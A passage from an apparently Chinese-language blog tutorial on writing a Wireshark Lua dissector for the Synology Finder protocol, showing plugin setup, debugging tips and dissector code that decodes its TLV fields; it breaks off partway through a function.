title="协议解析插件编写"></a>协议解析插件编写</h3><p><code>Wireshark</code>本身以及其自带的很多插件都是用C语言写的，同时其也提供了对应的<code>Lua</code>接口，使得编写协议解析插件变得很容易。</p><h4 id="插件安装及调试"><a href="#插件安装及调试" class="headerlink" title="插件安装及调试"></a>插件安装及调试</h4><p>在<code>&quot;帮助 -&gt; 关于 Wireshark -&gt; 文件夹&quot;</code>中可以看到<code>Lua</code>插件的保存路径，将插件放到对应的路径中即可，然后通过<code>Ctrl+Shift+L</code>快捷键来重新加载插件使其生效。</p><p>至于调试<code>Lua</code>脚本，一般采用<code>print()</code>的方式就足够了，在<code>&quot;工具 -&gt; Lua&quot; </code> 中打开<code>Console</code>窗口可查看打印的内容。另一种方式是在<code>&quot;编辑 -&gt; 首选项 -&gt;  高级&quot;</code>中设置<code>gui.console_open</code>为<code>Always</code>，同时设置<code>console.log.level</code>为<code>255</code>，这样在启动<code>Wireshark</code>时会自动打开<code>debug</code>窗口，以便查看打印的内容。</p><blockquote><p>笔者在测试时，发现每次按<code>Ctrl+Shift+L</code>快捷键重新加载插件时<code>Console</code>窗口会自动关闭，导致看不到打印的内容。</p></blockquote><p>另外，如果编写的<code>Lua</code>插件在运行时出现错误，对应的错误信息会出现<code>Wireshark</code>的协议解析窗口中，可以根据该错误信息去查看<code>Wireshark</code>或<code>Lua</code>的相关文档。一个比较有用的小技巧是，有时候在编写插件时不知道某个参数的类型或者某个对象实例有哪些方法，可以通过故意出错的方式来产生错误信息，然后根据该信息去查阅文档。</p><h4 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h4><p>一个基本的协议解析插件的代码框架如下。其中，协议解析的主要逻辑在<code>dissector()</code>函数中，该函数有3个参数，如下：</p><ul><li><p><code>buffer</code>：类型为<code>Tvb</code>，包含对应数据包的内容</p></li><li><p><code>pinfo</code>：类型为<code>Pinfo</code>，包含数据包列表中的列信息</p></li><li><p><code>tree</code>：类型为<code>TreeItem</code>，包含数据包详情面板中的相关信息</p></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- create a Proto object</span></span><br><span class="line"><span class="keyword">local</span> synoFinderProtocol = Proto(<span class="string">&quot;SynoFinder&quot;</span>, <span class="string">&quot;Synology Finder Protocol&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> protoName = <span class="string">&quot;syno_finder&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- create ProtoField Objects</span></span><br><span class="line"><span class="keyword">local</span> magic = ProtoField.bytes(protoName .. <span class="string">&quot;.magic&quot;</span>, <span class="string">&quot;Magic&quot;</span>, base.SPACE)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1) register fields</span></span><br><span class="line">synoFinderProtocol.fields = &#123;magic&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">synoFinderProtocol.dissector</span><span class="params">(buffer, pinfo, tree)</span></span></span><br><span class="line">    <span class="keyword">local</span> buffer_length = buffer:<span class="built_in">len</span>()</span><br><span class="line">    <span class="keyword">if</span> buffer_length == <span class="number">0</span> <span class="keyword">then</span> <span class="keyword">return</span> <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- set the name of protocol column</span></span><br><span class="line">    pinfo.cols.protocol = synoFinderProtocol.name</span><br><span class="line">    </span><br><span class="line">    <span class="comment">-- create a sub tree representing the synology finder protocol data</span></span><br><span class="line">    <span class="keyword">local</span> subtree = tree:add(synoFinderProtocol, buffer(), <span class="string">&quot;Synology Finder Protocol&quot;</span>)</span><br><span class="line">    <span class="comment">-- (2) add fields</span></span><br><span class="line">    subtree:add_le(magic, buffer(<span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> udp_port = DissectorTable.get(<span class="string">&quot;udp.port&quot;</span>)</span><br><span class="line"><span class="comment">-- bind port to protocol</span></span><br><span class="line">udp_port:add(<span class="number">9999</span>, synoFinderProtocol)</span><br></pre></td></tr></table></figure><p>基于上述代码框架，为了解析协议，只需要创建对应的协议字段并在<code>(1)</code>处注册，然后在<code>(2)</code>处添加到<code>tree</code>中即可。需要说明的是，后续要使用的协议字段必须在<code>(1)</code>处进行注册，但其注册的先后顺序并不代表其在<code>tree</code>中的顺序，同时注册的协议字段也可能并未使用。</p><img data-src="images/syno_finder_plugin_init.png" style="zoom:80%"><p>由于<code>syno_finder</code>协议相对比较简单，同时后面的数据存在一定的规律，只需要再创建<code>3</code>个字段，然后在循环中进行解析即可，对应的解析结果如下。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> magic = ProtoField.bytes(protoName .. <span class="string">&quot;.magic&quot;</span>, <span class="string">&quot;Magic&quot;</span>, base.SPACE)</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">type</span> = ProtoField.uint8(protoName .. <span class="string">&quot;.type&quot;</span>, <span class="string">&quot;Type&quot;</span>, base.HEX)</span><br><span class="line"><span class="keyword">local</span> length = ProtoField.uint8(protoName .. <span class="string">&quot;.length&quot;</span>, <span class="string">&quot;Length&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> value = ProtoField.bytes(protoName .. <span class="string">&quot;.value&quot;</span>, <span class="string">&quot;Value&quot;</span>)</span><br><span class="line"></span><br><span class="line">synoFinderProtocol.fields = &#123;magic, <span class="built_in">type</span>, length, value&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">synoFinderProtocol.dissector</span><span class="params">(buffer, pinfo, tree)</span></span></span><br><span class="line">    <span class="comment">-- ...</span></span><br><span class="line">    <span class="keyword">local</span> subtree = tree:add(synoFinderProtocol, buffer(), <span class="string">&quot;Synology Finder Protocol&quot;</span>)</span><br><span class="line">    subtree:add_le(magic, buffer(<span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">local</span> payloadStart = <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> payloadStart + offset &lt; buffer_length <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">local</span> tlvLength = buffer(payloadStart + offset + <span class="number">1</span>, <span class="number">1</span>):uint()</span><br><span class="line">        subtree:add_le(<span class="built_in">type</span>, buffer(payloadStart + offset, <span class="number">1</span>))</span><br><span class="line">        subtree:add_le(length, buffer(payloadStart + offset + <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        subtree:add_le(value, buffer(payloadStart + offset + <span class="number">2</span>, tlvLength))</span><br><span class="line">        offset = offset + <span class="number">2</span> + tlvLength</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><img data-src="images/syno_finder_plugin_simple.png" style="zoom:80%"><p>到这里，一个最基本的协议解析插件就算完成了。但是从上面的图片可以看到，上述代码只是完成了最基本的功能，显示的结果并不太友好，还有进一步优化的空间：</p><ul><li>将每个<code>tlv</code>进行聚合，同时根据<code>type</code>类型的不同显示不同的名称；</li><li>根据<code>value</code>对应的类型以不同的方式呈现其值，比如<code>ip</code>地址、<code>mac</code>地址等，同时考虑对应的字节序。</li></ul><p>参考<code>Wireshark</code>中<code>CDP</code>协议解析插件的实现方式，最终呈现的效果以及完整的插件代码如下。</p><img data-src="images/syno_finder_plugin_final.png" style="zoom:80%"><br /><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> synoFinderProtocol = Proto(<span class="string">&quot;SynoFinder&quot;</span>, <span class="string">&quot;Synology Finder Protocol&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> protoName = <span class="string">&quot;syno_finder&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> typeNames = &#123;</span><br><span class="line">    [<span class="number">0x1</span>] = <span class="string">&quot;Packet Type&quot;</span>,</span><br><span class="line">    [<span class="number">0x11</span>] = <span class="string">&quot;Server Name&quot;</span>,</span><br><span class="line">    [<span class="number">0x12</span>] = <span class="string">&quot;IP&quot;</span>,</span><br><span class="line">    [<span class="number">0x13</span>] = <span class="string">&quot;Subnet Mask&quot;</span>,</span><br><span class="line">    [<span class="number">0x14</span>] = <span class="string">&quot;DNS&quot;</span>,</span><br><span class="line">    [<span class="number">0x15</span>] = <span class="string">&quot;DNS&quot;</span>,</span><br><span class="line">    [<span class="number">0x19</span>] = <span class="string">&quot;Mac Address&quot;</span>,</span><br><span class="line">    [<span class="number">0x1e</span>] = <span class="string">&quot;Gateway&quot;</span>,</span><br><span class="line">    [<span class="number">0x20</span>] = <span class="string">&quot;Packet Subtype&quot;</span>,</span><br><span class="line">    [<span class="number">0x21</span>] = <span class="string">&quot;Server Name&quot;</span>,</span><br><span class="line">    [<span class="number">0x29</span>] = <span class="string">&quot;Mac Address&quot;</span>,</span><br><span class="line">    [<span class="number">0x2a</span>] = <span class="string">&quot;Password&quot;</span>,</span><br><span class="line">    [<span class="number">0x4a</span>] = <span class="string">&quot;Username&quot;</span>,</span><br><span class="line">    [<span class="number">0x4b</span>] = <span class="string">&quot;Share Folder&quot;</span>,</span><br><span class="line">    [<span class="number">0x70</span>] = <span class="string">&quot;Arch&quot;</span>,</span><br><span class="line">    [<span class="number">0x73</span>] = <span class="string">&quot;Serial Num&quot;</span>,</span><br><span class="line">    [<span class="number">0x77</span>] = <span class="string">&quot;Version&quot;</span>,</span><br><span class="line">    [<span class="number">0x78</span>] = <span class="string">&quot;Model&quot;</span>,</span><br><span class="line">    [<span class="number">0x7c</span>] = <span class="string">&quot;Mac Address&quot;</span>,</span><br><span class="line">    [<span class="number">0xc0</span>] = <span class="string">&quot;Serial Num&quot;</span>,</span><br><span class="line">    [<span class="number">0xc1</span>] = <span class="string">&quot;Category&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> magic = ProtoField.bytes(protoName .. <span class="string">&quot;.magic&quot;</span>, <span class="string">&quot;Magic&quot;</span>, base.SPACE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">type</span> = ProtoField.uint8(protoName .. <span class="string">&quot;.type&quot;</span>, <span class="string">&quot;Type&quot;</span>, base.HEX, typeNames)</span><br><span class="line"><span class="keyword">local</span> length = ProtoField.uint8(protoName .. <span class="string">&quot;.length&quot;</span>, <span class="string">&quot;Length&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> value = ProtoField.bytes(protoName .. <span class="string">&quot;.value&quot;</span>, <span class="string">&quot;Value&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- specific value field</span></span><br><span class="line"><span class="keyword">local</span> packetType = ProtoField.uint32(protoName .. <span class="string">&quot;.packet_type&quot;</span>, <span class="string">&quot;Packet Type&quot;</span>, base.HEX)</span><br><span class="line"><span class="keyword">local</span> serverName = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.username&quot;</span>, <span class="string">&quot;Server Name&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> ipAddress = ProtoField.ipv4(protoName .. <span class="string">&quot;.ip_address&quot;</span>, <span class="string">&quot;IP&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> ipMask = ProtoField.ipv4(protoName .. <span class="string">&quot;.subnet_mask&quot;</span>, <span class="string">&quot;Subnet Mask&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> dns = ProtoField.ipv4(protoName .. <span class="string">&quot;.dns&quot;</span>, <span class="string">&quot;DNS&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> macAddress = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.mac_address&quot;</span>, <span class="string">&quot;Mac Address&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> ipGateway = ProtoField.ipv4(protoName .. <span class="string">&quot;.gateway&quot;</span>, <span class="string">&quot;Gateway&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> packetSubtype = ProtoField.uint32(protoName .. <span class="string">&quot;.packet_subtype&quot;</span>, <span class="string">&quot;Packet Subtype&quot;</span>, base.HEX)</span><br><span class="line"><span class="keyword">local</span> password = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.password&quot;</span>, <span class="string">&quot;Password&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> arch = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.arch&quot;</span>, <span class="string">&quot;Arch&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> username = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.username&quot;</span>, <span class="string">&quot;Username&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> shareFolder = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.share_folder&quot;</span>, <span class="string">&quot;Share Folder&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> version = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.version&quot;</span>, <span class="string">&quot;Version&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> model = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.model&quot;</span>, <span class="string">&quot;Model&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> serialNum = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.serial_num&quot;</span>, <span class="string">&quot;Serial Num&quot;</span>)</span><br><span class="line"><span class="keyword">local</span> category = ProtoField.<span class="built_in">string</span>(protoName .. <span class="string">&quot;.category&quot;</span>, <span class="string">&quot;Category&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> value8 = ProtoField.uint8(protoName .. <span class="string">&quot;.value&quot;</span>, <span class="string">&quot;Value&quot;</span>, base.HEX)</span><br><span class="line"><span class="keyword">local</span> value16 = ProtoField.uint16(protoName .. <span class="string">&quot;.value&quot;</span>, <span class="string">&quot;Value&quot;</span>, base.HEX)</span><br><span class="line"><span class="keyword">local</span> value32 = ProtoField.uint32(protoName .. <span class="string">&quot;.value&quot;</span>, <span class="string">&quot;Value&quot;</span>, base.HEX)</span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> typeFields = &#123;</span><br><span class="line">    [<span class="number">0x1</span>] = packetType,</span><br><span class="line">    [<span class="number">0x11</span>] = serverName,</span><br><span class="line">    [<span class="number">0x12</span>] = ipAddress,</span><br><span class="line">    [<span class="number">0x13</span>] = ipMask,</span><br><span class="line">    [<span class="number">0x14</span>] = dns,</span><br><span class="line">    [<span class="number">0x15</span>] = dns,</span><br><span class="line">    [<span class="number">0x19</span>] = macAddress,</span><br><span class="line">    [<span class="number">0x1e</span>] = ipGateway,</span><br><span class="line">    [<span class="number">0x20</span>] = packetSubtype,</span><br><span class="line">    [<span class="number">0x21</span>] = serverName,</span><br><span class="line">    [<span class="number">0x29</span>] = macAddress,</span><br><span class="line">    [<span class="number">0x2a</span>] = password,</span><br><span class="line">    [<span class="number">0x4a</span>] = username,</span><br><span class="line">    [<span class="number">0x4b</span>] = shareFolder,</span><br><span class="line">    [<span class="number">0x70</span>] = arch,</span><br><span class="line">    [<span class="number">0x73</span>] = serialNum,</span><br><span class="line">    [<span class="number">0x77</span>] = version,</span><br><span class="line">    [<span class="number">0x78</span>] = model,</span><br><span class="line">    [<span class="number">0x7c</span>] = macAddress,</span><br><span class="line">    [<span class="number">0xc0</span>] = serialNum,</span><br><span class="line">    [<span class="number">0xc1</span>] = category</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- display in subtree header</span></span><br><span class="line"><span class="comment">-- reference: https://gist.github.com/FreeBirdLjj/6303864</span></span><br><span class="line"><span class="keyword">local</span> typeFormats = &#123;</span><br><span class="line">    [<span class="number">0x1</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;0x%x&quot;</span>, value:le_uint())</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x11</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x12</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:ipv4()     <span class="comment">-- Address object</span></span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x13</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:ipv4()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x14</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:ipv4()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x15</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:ipv4()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x19</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x1e</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:ipv4()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x20</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;0x%x&quot;</span>, value:le_uint())</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x21</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x29</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x2a</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x4a</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x4b</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x70</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x73</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x77</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x78</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0x7c</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0xc0</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    [<span class="number">0xc1</span>] = <span class="function"><span class="keyword">function</span> <span class="params">(value)</span></span></span><br><span class="line">        <span class="keyword">return</span> value:<span class="built_in">string</span>()</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- register fields</span></span><br><span class="line">synoFinderProtocol.fields = &#123;</span><br><span class="line">    magic,</span><br><span class="line">    <span class="built_in">type</span>, length, value,     <span class="comment">-- tlv</span></span><br><span class="line">    packetType, serverName, ipAddress, ipMask, ipGateway, macAddress, dns,  packetSubtype, password, arch, username, shareFolder, version, model, serialNum, category,       <span class="comment">-- specific value field</span></span><br><span class="line">    value8, value16, value32</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- reference: https://stackoverflow.com/questions/52012229/how-do-you-access-name-of-a-protofield-after-declaration</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFieldName</span><span class="params">(field)</span></span></span><br><span class="line">    <span class="keyword">local</span> fieldString = <span class="built_in">tostring</span>(field)</span><br><span class="line">    <span class="keyword">local</span> i, j = <span class="built_in">string</span>.<span class="built_in">find</span>(fieldString, <span class="string">&quot;: .* &quot;</span> .. protoName)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(fieldString, i + <span class="number">2</span>, j - (<span class="number">1</span> + <span class="built_in">string</span>.<span class="built_in">len</span>(protoName)))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFieldType</span><span class="params">(field)</span></span></span><br><span class="line">    <span class="keyword">local</span> fieldString = <span class="built_in">tostring</span>(field)</span><br><span class="line">    <span class="keyword">local</span> i, j = <span class="built_in">string</span>.<span class="built_in">find</span>(fieldString, <span class="string">&quot;ftypes.* &quot;</span> .. <span class="string">&quot;base&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(fieldString, i + <span class="number">7</span>, j - (<span class="number">1</span> + <span class="built_in">string</span>.<span class="built_in">len</span>(<span class="string">&quot;base&quot;</span>)))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFieldByType</span><span class="params">(type, length)</span></span></span><br><span class="line">    <span class="keyword">local</span> tmp_field = typeFields[<span class="built_in">type</span>]</span><br><span class="line">    <span class="keyword">if</span>(tmp_field) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> tmp_field    <span class="comment">-- specific value filed</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> length 